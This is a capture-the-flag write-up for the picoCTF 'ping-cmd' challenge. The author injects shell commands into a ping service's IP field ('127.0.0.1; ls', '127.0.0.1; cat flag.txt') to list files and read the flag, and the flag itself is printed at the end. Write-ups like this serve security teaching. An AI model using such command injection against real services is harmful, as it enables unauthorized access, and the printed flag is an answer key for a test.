# ping-cmd
## Description
Can you make the server reveal its secrets? It seems to be able to ping Google DNS, but what happens if you get a little creative with your input?

You can connect to the service here `nc mysterious-sea.picoctf.net 55591`
## Hints
1. The program uses a shell command behind the scenes.
2. Sometimes, You can run more than one command at a time.
## Solution
At first glance, it seems as though all this program does is ping an address.

```console
% nc mysterious-sea.picoctf.net 55591
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=111 time=8.38 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=111 time=8.39 ms

--- 8.8.8.8 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1001ms
rtt min/avg/max/mdev = 8.376/8.382/8.389/0.006 ms
```

Let’s try a different IP.

```console
% nc mysterious-sea.picoctf.net 55591
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 127.0.0.1
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.026 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.033 ms

--- 127.0.0.1 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1064ms
rtt min/avg/max/mdev = 0.026/0.029/0.033/0.003 ms
```

Well that’s a clue. Maybe we can list some files?

```console
% nc mysterious-sea.picoctf.net 55591
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 127.0.0.1; ls
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.030 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.039 ms

--- 127.0.0.1 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1053ms
rtt min/avg/max/mdev = 0.030/0.034/0.039/0.004 ms
flag.txt
script.sh
```

Too easy.

```console
% nc mysterious-sea.picoctf.net 55591
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 127.0.0.1; cat flag.txt
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.029 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.036 ms

--- 127.0.0.1 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1039ms
rtt min/avg/max/mdev = 0.029/0.032/0.036/0.003 ms
picoCTF{p1nG_c0mm@nd_3xpL0it_su33essFuL_252214ae}
```

The flag is revealed: `picoCTF{p1nG_c0mm@nd_3xpL0it_su33essFuL_252214ae}`